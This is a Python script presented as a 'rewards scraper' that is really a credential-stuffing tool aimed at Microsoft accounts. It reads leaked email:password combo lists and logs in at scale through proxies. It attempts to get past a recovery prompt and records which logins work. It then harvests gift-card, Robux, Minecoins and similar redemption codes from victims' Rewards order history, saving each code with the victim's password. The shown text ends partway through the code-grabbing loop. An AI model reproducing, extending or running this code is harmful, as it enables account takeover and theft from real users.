#!/usr/bin/env python3
"""
Multi-Platform Rewards Scraper - CLI with Category Selection
Supports Minecraft, Roblox, League of Legends, Overwatch, Gift Cards, and All
Self-contained authentication without external dependencies
"""

import requests
import threading
import time
from datetime import datetime
from pathlib import Path
import sys
import os
import re
from bs4 import BeautifulSoup
import json
import warnings
from tkinter import Tk, filedialog
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.panel import Panel

# ============================================================================
# SORTING FUNCTIONALITY
# ============================================================================

# Code pattern for extracting codes
CODE_REGEX = re.compile(r"\b[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}\b")

# Amount patterns for different types
ROBLOX_AMOUNT_REGEX = re.compile(r"(\d+)\s*(?:robux|rbx|r\$)", re.IGNORECASE)
MINECRAFT_AMOUNT_REGEX = re.compile(r"(\d+)\s*(?:minecoins|coins|minecraft coins)", re.IGNORECASE)
GIFTCARD_AMOUNT_REGEX = re.compile(r"\$(\d+)(?:\.\d{2})?")
LEAGUE_AMOUNT_REGEX = re.compile(r"(\d+)\s*(?:rp|riot points)", re.IGNORECASE)
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import cpu_count
from urllib.parse import urlparse, parse_qs

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

console = Console(force_terminal=True, width=100, legacy_windows=False)
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

# ============================================================================
# SORTING FUNCTIONS
# ============================================================================

def extract_amount_and_type(title):
    """Extract amount and type from title"""
    title = title.lower()
    
    # Check for Robux
    robux_match = ROBLOX_AMOUNT_REGEX.search(title)
    if robux_match:
        return int(robux_match.group(1)), 'robux'
    
    # Check for Minecraft coins
    minecraft_match = MINECRAFT_AMOUNT_REGEX.search(title)
    if minecraft_match:
        return int(minecraft_match.group(1)), 'minecraft'
    
    # Check for League of Legends RP
    league_match = LEAGUE_AMOUNT_REGEX.search(title)
    if league_match:
        return int(league_match.group(1)), 'league'
    
    # Check for gift cards
    giftcard_match = GIFTCARD_AMOUNT_REGEX.search(title)
    if giftcard_match:
        return int(giftcard_match.group(1)), 'giftcard'
    
    return 0, 'unknown'

def format_sorted_output(category_codes, all_results):
    """Format sorted codes with clean output"""
    lines = []
    
    # Group by amount and type
    amount_groups = {}
    
    for code_info in category_codes:
        amount, code_type = extract_amount_and_type(code_info['title'])
        
        # Create key based on type and amount
        key = f"{code_type}_{amount}"
        if key not in amount_groups:
            amount_groups[key] = []
        amount_groups[key].append(code_info)
    
    # Sort groups by amount (descending) within each type
    sorted_groups = {}
    for key in amount_groups:
        code_type, amount = key.split('_', 1)
        if code_type not in sorted_groups:
            sorted_groups[code_type] = []
        sorted_groups[code_type].append((int(amount), amount_groups[key]))
    
    # Sort each type by amount (descending)
    for code_type in sorted_groups:
        sorted_groups[code_type].sort(key=lambda x: x[0], reverse=True)
    
    # Generate output
    lines.append(f"🎮 SORTED CODES 🎮")
    lines.append("=" * 60)
    lines.append("")
    
    for code_type in sorted(sorted_groups.keys()):
        lines.append(f"📋 {code_type.upper()} CODES")
        lines.append("-" * 50)
        
        for amount, codes in sorted_groups[code_type]:
            # Remove duplicates and count
            unique_codes = {}
            for code_info in codes:
                code = code_info['code']
                if code not in unique_codes:
                    unique_codes[code] = []
                unique_codes[code].append(code_info)
            
            # Display codes in clean format
            for code, code_infos in unique_codes.items():
                if len(code_infos) == 1:
                    info = code_infos[0]
                    if amount > 0:
                        if code_type == 'giftcard':
                            # Extract gift card type from title
                            title = info['title'].upper()
                            lines.append(f"{code} - {title}")
                        else:
                            lines.append(f"{code} - {amount} {code_type.upper()}")
                    else:
                        lines.append(f"{code}")
                    # Add redemption URL for gift cards
                    if code_type == 'giftcard':
                        redemption_result = next((r for r in all_results if r['code'] == code and r.get('redemption_url')), None)
                        if redemption_result:
                            lines.append(f"Redemption URL: {redemption_result['redemption_url']}")
                else:
                    info = code_infos[0]
                    if amount > 0:
                        if code_type == 'giftcard':
                            # Extract gift card type from title
                            title = info['title'].upper()
                            lines.append(f"{code} (x{len(code_infos)}) - {title}")
                        else:
                            lines.append(f"{code} (x{len(code_infos)}) - {amount} {code_type.upper()}")
                    else:
                        lines.append(f"{code} (x{len(code_infos)})")
                    # Add redemption URL for gift cards
                    if code_type == 'giftcard':
                        redemption_result = next((r for r in all_results if r['code'] == code and r.get('redemption_url')), None)
                        if redemption_result:
                            lines.append(f"Redemption URL: {redemption_result['redemption_url']}")
        
        lines.append("")
    
    # Summary
    total_codes = sum(len(group) for group in amount_groups.values() for group in group)
    lines.append("📊 SUMMARY")
    lines.append("=" * 60)
    lines.append(f"Total codes: {total_codes}")
    lines.append(f"Categories: {len(sorted_groups)}")
    lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return "\n".join(lines) + "\n"

def sort_and_save_codes(results_folder, category_codes, category_name, all_results):
    """Sort codes and save to file"""
    if not category_codes:
        return
    
    console.print(f"\n[🔄] Sorting {len(category_codes)} {category_name} codes...", style="cyan")
    
    # Format sorted output
    formatted_output = format_sorted_output(category_codes, all_results)
    
    # Save to file
    sorted_file = results_folder / f"sorted_{category_name}.txt"
    with open(sorted_file, 'w', encoding='utf-8') as f:
        f.write(formatted_output)
    
    console.print(f"[✓] Sorted codes saved to: {sorted_file}", style="green")
    
    # Show preview
    lines = formatted_output.split('\n')
    console.print("\n[📋] Preview:", style="yellow")
    console.print("=" * 60, style="cyan")
    for i, line in enumerate(lines[:20]):  # Show first 20 lines
        console.print(line)
    if len(lines) > 20:
        console.print(f"... and {len(lines) - 20} more lines", style="yellow")
    console.print("=" * 60, style="cyan")

# ============================================================================
# SELF-CONTAINED AUTHENTICATION FUNCTIONS
# ============================================================================
# Global variables from original
sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

def create_optimized_session(proxy=None):
    """Create optimized session with headers and optional proxy"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    
    # Add proxy if provided
    if proxy:
        session.proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }
    
    return session

def get_urlPost_sFTTag(session):
    """EXACT function from original"""
    maxretries = 3
    attempts = 0
    
    while attempts < maxretries:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                      'Accept-Language': 'en-US,en;q=0.9', 
                      'Accept-Encoding': 'gzip, deflate, br', 
                      'Connection': 'keep-alive', 
                      'Upgrade-Insecure-Requests': '1'}
            
            timeout_val = 10
            text = session.get(sFTTag_url, headers=headers, timeout=timeout_val, verify=False).text
            
            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                   re.search('value="(.+?)"', text, re.S) or \
                   re.search("sFTTag:'(.+?)'", text, re.S) or \
                   re.search('sFTTag:"(.+?)"', text, re.S) or \
                   re.search('name="PPFT".*?value="(.+?)"', text, re.S)
            
            if match:
                sFTTag = match.group(1)
                match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                       re.search("urlPost:'(.+?)'", text, re.S) or \
                       re.search('urlPost:"(.+?)"', text, re.S) or \
                       re.search('<form.*?action="(.+?)"', text, re.S)
                
                if match:
                    urlPost = match.group(1)
                    urlPost = urlPost.replace('&amp;', '&')
                    return (urlPost, sFTTag, session)
        except Exception as e:
            pass
        
        attempts += 1
        time.sleep(0.1)
    
    return (None, None, session)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    """EXACT function from original"""
    maxretries = 3
    tries = 0
    
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 
                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                      'Accept-Language': 'en-US,en;q=0.9', 
                      'Accept-Encoding': 'gzip, deflate, br', 
                      'Connection': 'close'}
            
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, 
                                        timeout=10, verify=False)
            
            # Check for successful login with token
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            
            # Check for 2FA flow
            elif 'cancel?mkt=' in login_request.text:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                    
                    if ipt and pprid and uaid:
                        data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                        
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                        if action:
                            ret = session.post(action.group(), data=data, allow_redirects=True, 
                                             timeout=10, verify=False)
                            
                            return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if return_url:
                                fin = session.get(return_url.group(), allow_redirects=True, 
                                                timeout=10, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                if token != 'None':
                                    return (token, session)
                except:
                    pass
            
            # Check for 2FA indicators
            elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                return ('2FA', session)
            
            # Check for invalid credentials
            elif any(value in login_request.text.lower() for value in [
                'password is incorrect', 
                "account doesn't exist", 
                "that microsoft account doesn't exist",
                'sign in to your microsoft account',
                "tried to sign in too many times with an incorrect account or password",
                'help us protect your account'
            ]):
                return ('None', session)
            
        except Exception as e:
            pass
        
        tries += 1
        time.sleep(0.1)
    
    return ('None', session)

class Settings:
    
    DEFAULT_SETTINGS = {
        'timeout': 5,
        'max_threads': 100,
        'retry_count': 2,
        'save_invalid': False,
        'auto_save': True,
        'selected_category': 'All',
    }
    
    def __init__(self):
        self.settings_file = Path(__file__).parent / "settings.json"
        self.settings = self.load()
    
    def load(self):
        """Load settings from file or use defaults"""
        if self.settings_file.exists():
            try:
                with open(self.settings_file, 'r') as f:
                    return json.load(f)
            except:
                return self.DEFAULT_SETTINGS.copy()
        return self.DEFAULT_SETTINGS.copy()
    
    def save(self):
        """Save settings to file"""
        try:
            with open(self.settings_file, 'w') as f:
                json.dump(self.settings, f, indent=2)
            console.print("[bold green][✓] Settings saved[/bold green]")
        except Exception as e:
            console.print(f"[bold red][!] Failed to save settings: {e}[/bold red]")
    
    def get(self, key, default=None):
        """Get setting value"""
        return self.settings.get(key, default)
    
    def set(self, key, value):
        """Set setting value"""
        self.settings[key] = value


class ComboParser:
    """Parse combo file lines to extract EMAIL:PASS - ULTRA FAST with 1000 threads"""
    
    def __init__(self, file_path):
        self.file_path = file_path
        self.accounts = []
    
    def parse(self):
        """Parse combo file with multi-threading"""
        try:
            with open(self.file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Ultra-fast parsing with list comprehension
            self.accounts = []
            for line in lines:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts
                        if '@' in email and len(email) > 5 and len(password) > 3:
                            self.accounts.append((email, password))
            
            return self.accounts
        except Exception as e:
            console.print(f"[!] Error parsing combo file: {e}", style="red")
            return []

class MultiPlatformScraper:
    """Multi-platform scraper with category selection"""
    
    def __init__(self, accounts, settings, category, proxy_manager=None):
        self.accounts = accounts
        self.settings = settings
        self.category = category
        self.proxy_manager = proxy_manager
        self.results = []
        self.valid_accounts = []
        self.invalid_accounts = []
        self.lock = threading.Lock()
        
        # Initialize real-time file saving
        self.timestamp = datetime.now().strftime('%m%d%Y%H%M')
        self.results_folder = Path(f"results-{self.timestamp}")
        self.results_folder.mkdir(exist_ok=True)
        self.category_files = {}  # Track open file handles
        self.saved_codes = set()  # Track codes already saved to avoid duplicates
        self.category_config = {
            'Minecraft': {
                'keywords': ['minecraft', 'minecoins', 'minecraft minecoins', 'minecoin', 'minecraft coins'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Minecraft',
                'amount_pattern': r'(\d+)\s*(?:minecoins|coins|minecraft coins)'
            },
            'Roblox': {
                'keywords': ['roblox', 'robux', 'roblox robux', 'roblox digital', 'roblox card'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Roblox',
                'amount_pattern': r'(\d+)\s*(?:robux|rbx|r\$)'
            },
            'League of Legends': {
                'keywords': ['league of legends', 'lol', 'riot points', 'rp', 'league rp'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'League of Legends',
                'amount_pattern': r'(\d+)\s*(?:rp|riot points)'
            },
            'Overwatch': {
                'keywords': ['overwatch', 'overwatch coins', 'overwatch league tokens', 'owl tokens'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Overwatch',
                'amount_pattern': r'(\d+)\s*(?:coins|tokens|league tokens)'
            },
            'Sea of Thieves': {
                'keywords': ['sea of thieves', 'sea thieves', 'ancient coins', 'sof coins'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Sea of Thieves',
                'amount_pattern': r'(\d+)\s*(?:coins|ancient coins)'
            },
            'Game Pass': {
                'keywords': ['game pass', 'xbox game pass', 'gamepass', 'xbox gamepass'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Game Pass',
                'amount_pattern': r'(\d+)\s*(?:month|months|day|days)'
            },
            'GIFTCARDS': {
                'keywords': ['gift card', 'giftcard', 'gift cards', 'amazon', 'steam', 'playstation', 'xbox', 'nintendo', 'target', 'starbucks', 'subway', 'doordash', 'uber eats', 'uber', 'walmart'],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'Gift Cards',
                'amount_pattern': r'\$(\d+)(?:\.\d{2})?'
            },
            'All': {
                'keywords': [],
                'code_pattern': r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}|[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
                'display_name': 'All Categories',
                'amount_pattern': None
            }
        }
    
    def save_code_realtime(self, code, info, email, password, category, redemption_url=""):
        """Save a single code to its category file in real-time"""
        # Ensure category is a string
        if not isinstance(category, str):
            category = str(category)
        
        # Determine file name based on category
        if category.lower() == 'unknown':
            info_lower = info.lower()
            if 'overwatch' in info_lower or 'overwatch coins' in info_lower:
                file_name = 'overwatch'
            elif 'robux' in info_lower or 'roblox' in info_lower:
                file_name = 'roblox'
            elif 'minecoins' in info_lower or 'minecraft' in info_lower:
                file_name = 'minecraft'
            elif 'rp' in info_lower or 'league' in info_lower or 'league of legends' in info_lower:
                file_name = 'leagueoflegends'
            elif 'gift' in info_lower or 'card' in info_lower or '$' in info_lower:
                file_name = 'giftcards'
            elif 'game pass' in info_lower or 'gamepass' in info_lower:
                file_name = 'gamepass'
            elif 'sea of thieves' in info_lower or 'pirates' in info_lower:
                file_name = 'seaofthieves'
            else:
                file_name = 'unknown'
        else:
            file_name = category.lower().replace(' ', '').replace('of', 'of')
        
        # Check if code already saved
        code_key = (code, email)
        if code_key in self.saved_codes:
            return
        
        self.saved_codes.add(code_key)
        
        # Add redemption URL if available
        if redemption_url:
            info_with_url = f"{info} | Redeem: {redemption_url}"
        else:
            info_with_url = info
        
        # Get or create file handle
        if file_name not in self.category_files:
            category_file = self.results_folder / f"{file_name}.txt"
            self.category_files[file_name] = open(category_file, 'w', encoding='utf-8')
            # Write header
            self.category_files[file_name].write(f"{file_name.upper()} CODES\n")
            self.category_files[file_name].write(f"{'='*50}\n\n")
            self.category_files[file_name].flush()
        
        # Write code to file
        file_handle = self.category_files[file_name]
        file_handle.write(f"{code}\n")
        file_handle.write(f"Account: {email}\n")
        file_handle.write(f"Password: {password}\n")
        file_handle.write(f"Info: {info_with_url}\n")
        file_handle.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file_handle.write(f"{'-'*30}\n\n")
        file_handle.flush()  # Force write to disk immediately
        
        console.print(f"[+] Saved to {file_name}.txt: {code} - {info}", style="green")
    
    def close_all_files(self):
        """Close all open file handles"""
        for file_handle in self.category_files.values():
            file_handle.close()
        self.category_files.clear()
    
    def save_valid_accounts_realtime(self, email, password):
        """Save valid account to valid.txt in real-time"""
        valid_file = self.results_folder / "valid.txt"
        
        # Check if file exists, if not create with header
        if not valid_file.exists():
            with open(valid_file, 'w', encoding='utf-8') as f:
                f.write("VALID ACCOUNTS\n")
                f.write(f"{'='*50}\n\n")
        
        # Append account
        with open(valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")
            f.flush()
    
    def detect_category_from_title(self, order_title, full_row_text=None):
        """Detect category from order title with multi-language support"""
        order_title_lower = order_title.lower()
        text_to_check = full_row_text.lower() if full_row_text else order_title_lower
        
        # Priority-based detection to prevent misclassification
        # Check specific categories first (with multi-language support)
        if any(keyword in text_to_check for keyword in ['overwatch', 'overwatch coins', 'owl tokens']):
            return 'Overwatch'
        elif any(keyword in text_to_check for keyword in ['sea of thieves', 'sea thieves', 'ancient coins', 'monedas', 'alijo secreto', 'tesoro oculto', 'lost chest', 'secret cache']):
            return 'Sea of Thieves'
        elif any(keyword in text_to_check for keyword in ['roblox', 'robux']):
            return 'Roblox'
        elif any(keyword in text_to_check for keyword in ['league of legends', 'lol', 'riot points', 'puntos riot', 'ra-']):
            return 'League of Legends'
        elif any(keyword in text_to_check for keyword in ['game pass', 'xbox game pass', 'gamepass']):
            return 'Game Pass'
        elif any(keyword in text_to_check for keyword in ['minecraft', 'minecoins', 'monedas minecraft']):
            return 'Minecraft'
        elif any(keyword in text_to_check for keyword in ['gift card', 'giftcard', 'amazon', 'steam', 'playstation', 'xbox', 'nintendo', 'target', 'starbucks', 'subway', 'doordash', 'uber eats', 'uber', 'walmart', 'spotify', 'premium', 'tarjeta regalo']):
            return 'GIFTCARDS'
        
        return 'Unknown'
    
    def extract_code_info(self, order_title, category, full_row_text=None):
        """Extract code info with category-specific patterns and multi-language support"""
        config = self.category_config.get(category, self.category_config['All'])
        order_title_lower = order_title.lower()
        
        # Special handling for 'All' category
        if category == 'All':
            detected_category = self.detect_category_from_title(order_title, full_row_text)
            if detected_category != 'Unknown':
                return self.extract_code_info(order_title, detected_category, full_row_text)
        
        # Extract amount based on category (with multi-language support)
        amount = None
        if config['amount_pattern']:
            amount_match = re.search(config['amount_pattern'], order_title_lower)
            if amount_match:
                amount = amount_match.group(1)
        
        # Additional multi-language amount detection
        if not amount:
            # Spanish/French/Portuguese number patterns
            amount_match = re.search(r'(\d+)\s*(?:monedas|coins|pièces|moedas)', order_title_lower)
            if amount_match:
                amount = amount_match.group(1)
        
        # Format output based on category and amount
        if category == 'Minecraft' and amount:
            return f"{amount} MINECOINS CODE FOUND"
        elif category == 'Roblox' and amount:
            return f"{amount} ROBUX CODE FOUND"
        elif category == 'League of Legends' and amount:
            return f"{amount} RP CODE FOUND"
        elif category == 'Overwatch' and amount:
            return f"{amount} OVERWATCH COINS CODE FOUND"
        elif category == 'Sea of Thieves' and amount:
            return f"{amount} ANCIENT COINS CODE FOUND"
        elif category == 'Game Pass' and amount:
            if 'month' in order_title_lower:
                return f"{amount} MONTH GAME PASS CODE FOUND"
            elif 'day' in order_title_lower:
                return f"{amount} DAY GAME PASS CODE FOUND"
            else:
                return f"GAME PASS CODE FOUND"
        elif category == 'GIFTCARDS':
            # Detect specific gift card type
            if 'amazon' in order_title_lower:
                if amount:
                    return f"${amount} AMAZON GIFT CARD FOUND"
                else:
                    return "AMAZON GIFT CARD FOUND"
            elif 'steam' in order_title_lower:
                if amount:
                    return f"${amount} STEAM GIFT CARD FOUND"
                else:
                    return "STEAM GIFT CARD FOUND"
            elif 'playstation' in order_title_lower or 'psn' in order_title_lower:
                if amount:
                    return f"${amount} PLAYSTATION GIFT CARD FOUND"
                else:
                    return "PLAYSTATION GIFT CARD FOUND"
            elif 'xbox' in order_title_lower:
                if amount:
                    return f"${amount} XBOX GIFT CARD FOUND"
                else:
                    return "XBOX GIFT CARD FOUND"
            elif 'nintendo' in order_title_lower:
                if amount:
                    return f"${amount} NINTENDO GIFT CARD FOUND"
                else:
                    return "NINTENDO GIFT CARD FOUND"
            elif 'target' in order_title_lower:
                if amount:
                    return f"${amount} TARGET GIFT CARD FOUND"
                else:
                    return "TARGET GIFT CARD FOUND"
            elif 'starbucks' in order_title_lower:
                if amount:
                    return f"${amount} STARBUCKS GIFT CARD FOUND"
                else:
                    return "STARBUCKS GIFT CARD FOUND"
            elif 'subway' in order_title_lower:
                if amount:
                    return f"${amount} SUBWAY GIFT CARD FOUND"
                else:
                    return "SUBWAY GIFT CARD FOUND"
            elif 'doordash' in order_title_lower:
                if amount:
                    return f"${amount} DOORDASH GIFT CARD FOUND"
                else:
                    return "DOORDASH GIFT CARD FOUND"
            elif 'uber eats' in order_title_lower or 'uber' in order_title_lower:
                if amount:
                    return f"${amount} UBER EATS GIFT CARD FOUND"
                else:
                    return "UBER EATS GIFT CARD FOUND"
            elif 'walmart' in order_title_lower:
                if amount:
                    return f"${amount} WALMART GIFT CARD FOUND"
                else:
                    return "WALMART GIFT CARD FOUND"
            elif 'spotify' in order_title_lower or 'premium' in order_title_lower:
                if '3 month' in order_title_lower or '3 months' in order_title_lower:
                    return "3 MONTHS SPOTIFY PREMIUM FOUND"
                elif '1 month' in order_title_lower or '1 months' in order_title_lower:
                    return "1 MONTH SPOTIFY PREMIUM FOUND"
                elif '6 month' in order_title_lower or '6 months' in order_title_lower:
                    return "6 MONTHS SPOTIFY PREMIUM FOUND"
                elif '12 month' in order_title_lower or '12 months' in order_title_lower or '1 year' in order_title_lower:
                    return "12 MONTHS SPOTIFY PREMIUM FOUND"
                else:
                    return "SPOTIFY PREMIUM FOUND"
            elif amount:
                return f"${amount} GIFT CARD FOUND"
            else:
                return "GIFT CARD FOUND"
        
        return f"{category.upper()} CODE FOUND"
    
    def login_and_scrape(self, email, password):
        """Login and scrape Microsoft Rewards with self-contained auth"""
        try:
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager and self.proxy_manager.proxy_settings.get('use_proxies', False):
                if self.proxy_manager.proxy_settings.get('rotate', False):
                    proxy = self.proxy_manager.get_next_proxy()
                else:
                    proxy = self.proxy_manager.get_random_proxy()
            
            # Create optimized session with proxy
            session = create_optimized_session(proxy)
            
            # Get PPFT token and urlPost
            urlPost, sFTTag, session = get_urlPost_sFTTag(session)
            
            if not urlPost or not sFTTag:
                return False
            
            # Login with Xbox RPS
            token_result = get_xbox_rps(session, email, password, urlPost, sFTTag)
            
            if isinstance(token_result, tuple):
                token, session = token_result
            else:
                return False
            
            # Check token validity
            if not token or token == 'None':
                return False
            
            if token == '2FA':
                return False
            
            # Get redemption codes from order history
            codes = []
            try:
                url = 'https://rewards.bing.com/redeem/orderhistory'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Referer': 'https://rewards.bing.com/',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                
                r = session.get(url, headers=headers, timeout=10, verify=False)
                text = r.text if r is not None else ''
                
                # Handle JavaScript auto-submit pages
                if 'fmHF' in text or 'JavaScript required to sign in' in text:
                    try:
                        soup = BeautifulSoup(text, 'html.parser')
                        form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
                        if form and form.has_attr('action'):
                            action = form['action']
                            data = {}
                            for inp in form.find_all('input'):
                                name = inp.get('name')
                                if name:
                                    data[name] = inp.get('value', '')
                            
                            if action.startswith('/'):
                                action = 'https://login.live.com' + action
                            
                            rr = session.post(action, data=data, timeout=10, verify=False, allow_redirects=True)
                            r2 = session.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
                            text = r2.text if r2 is not None else text
                    except:
                        pass
                
                # Parse order history HTML
                soup = BeautifulSoup(text, 'html.parser')
                
                # Extract verification token
                verification_token = ''
                try:
                    token_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
                    if token_input and token_input.has_attr('value'):
                        verification_token = token_input['value']
                except:
                    pass
                
                # Extract orders with relevant codes based on category
                orders = []
                table = soup.find('table', class_='table')
                rows = []
                
                if table and table.tbody:
                    rows = table.tbody.find_all('tr')
                elif table:
                    rows = table.find_all('tr')
                
                config = self.category_config.get(self.category, self.category_config['All'])
                
                # Define code patterns outside the loop
                code_patterns = [
                    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 5-part codes (Minecraft, Game Pass)
                    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 4-part codes (League of Legends)
                    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 3-part codes (Roblox, etc.)
                ]
                
                # Words to exclude (not actual codes)
                exclude_words = {
                    'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM',
                    'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS',
                    'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION',
                    'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER',
                    'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE',
                    'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER',
                    'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER',
                    'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB',
                    'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS',
                    'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND',
                    'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT',
                    'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION',
                    'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'
                }
                
                for row in rows:
                    cells = row.find_all(['td', 'th'])
                    if len(cells) < 3:
                        continue
                    
                    # Get full row text for better category detection
                    full_row_text = row.get_text(strip=True)
                    
                    # Check what buttons are in this row
                    get_code_button = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                    resend_button = row.find('button', id=lambda x: x and x.startswith('ResendEmail_'))
                    
                    # Prioritize Get Code button, but also check if row has Get Code button even if Resend is found
                    if get_code_button:
                        # Extract action URL from button
                        action_url = get_code_button.get('data-actionurl', '')
                        # Decode HTML entities in the URL
                        action_url = action_url.replace('&amp;', '&')
                        
                        # Use the EXACT same method as the backup
                        order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ""
                        # Extract order date from the second cell (usually contains date)
                        order_date = cells[1].get_text(strip=True) if len(cells) > 1 else ""
                        full_row_text = row.get_text(strip=True)
                        detected_category = self.detect_category_from_title(order_title, full_row_text)
                        code_info = self.extract_code_info(order_title, detected_category, full_row_text)
                        
                        # Normalize action URL (use rewards.bing.com like backup)
                        if action_url.startswith('/'):
                            action_url = 'https://rewards.bing.com' + action_url
                        
                        try:
                            # POST to action URL to retrieve code (exact backup method)
                            post_data = {}
                            if verification_token:
                                post_data['__RequestVerificationToken'] = verification_token
                            
                            code_headers = {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'X-Requested-With': 'XMLHttpRequest',
                                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            }
                            
                            code_resp = session.post(action_url, data=post_data, headers=code_headers, timeout=10, verify=False)
                            code_html = code_resp.text if code_resp is not None else ''
                            code_soup = BeautifulSoup(code_html, 'html.parser')
                            code_found = False
                            code = None
                            
